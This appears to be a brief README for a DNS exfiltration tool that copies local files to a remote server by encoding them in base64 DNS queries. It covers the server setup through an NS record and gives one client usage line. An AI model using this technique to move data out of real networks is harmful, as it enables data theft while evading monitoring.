# dns_exfiltration
Simple DNS exfiltration using base64-encoded URL's

*Server Setup:*
server should be run on a machine with an NS record pointed at it.
Your domain will be used as the base url for the client.

*Client usage:*
```bash
client local_filename remote_filename base_url
```

watch as files are copied up to the server using only DNS requests.
